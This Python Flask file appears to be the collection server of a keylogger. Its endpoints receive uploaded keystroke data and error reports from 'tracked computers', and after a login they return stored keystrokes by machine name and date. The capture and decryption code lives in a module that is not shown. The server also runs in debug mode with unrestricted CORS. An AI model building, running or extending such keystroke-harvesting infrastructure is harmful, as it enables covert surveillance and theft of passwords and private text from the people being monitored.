from flask import Flask, jsonify
from request_functions import RequestFunctions
from flask_cors import CORS
from dotenv import load_dotenv
import os


app = Flask(__name__)
CORS(app)

load_dotenv()
DECRYPTION_KEY = os.getenv('DECRYPTION_KEY')
BASE_DIR = os.getenv("DATA_DIR", os.getcwd())
print(BASE_DIR)

# Create an instance of the RequestFunctions class with the necessary parameters
request_handler = RequestFunctions(BASE_DIR, DECRYPTION_KEY)

# POST requests

@app.route('/api/upload', methods=['POST'])
def upload():
    """Upload keystrokes data from the tracked computer"""
    try:
        response = request_handler.upload()
        if 'Error' in response:
            return jsonify(response), 400
        return jsonify(response), 200
    except Exception as e:
        return jsonify({'Error': str(e)}), 500

@app.route('/api/login', methods=['POST'])
def login():
    """Validate username and password for user login"""
    try:
        response = request_handler.login()
        if 'Error' in response:
            return jsonify(response), 400
        if 'Failed' in response:
            return jsonify(response), 401
        return jsonify(response), 200
    except Exception as e:
        return jsonify({'Error': str(e)}), 500

@app.route('/api/send_error', methods=['POST'])
def send_error():
    """Send an error message if an error occurred on the monitored computer"""
    try:
        response = request_handler.send_error()
        if 'Error' in response:
            return jsonify(response), 400
        return jsonify(response), 200
    except Exception as e:
        return jsonify({'Error': str(e)}), 500

# GET requests

@app.route('/api/get_machines_names', methods=['GET'])
def get_machines_names():
    """Get the list of tracked computer names"""
    try:
        response = request_handler.get_machines_names()
        return jsonify(response), 200
    except Exception as e:
        return jsonify({'Error': str(e)}), 500

@app.route('/api/get_dates_by_name/<name>', methods=['GET'])
def get_dates_by_name(name):
    """Get the list of dates collected for a specific computer"""
    try:
        response = request_handler.get_dates_by_name(name)
        if 'Error' in response:
            return jsonify(response), 400
        return jsonify(response), 200
    except Exception as e:
        return jsonify({'Error': str(e)}), 500

@app.route('/api/get_keystrokes_by_name_and_date/<name>/<date>', methods=['GET'])
def get_keystrokes_by_name_and_date(name, date):
    """Get keystroke data for a specific computer on a specific date"""
    try:
        response = request_handler.get_keystrokes_by_name_and_date(name, date)
        if 'Error' in response:
            return jsonify(response), 400
        return jsonify(response), 200
    except Exception as e:
        return jsonify({'Error': str(e)}), 500

@app.route('/api/get_error_file', methods=['GET'])
def get_error_file():
    """Get the file containing information about errors occurred on monitored computers"""
    try:
        response = request_handler.get_error_file()
        return jsonify(response), 200
    except Exception as e:
        return jsonify({'Error': str(e)}), 500


if __name__ == '__main__':
    app.run(debug=True)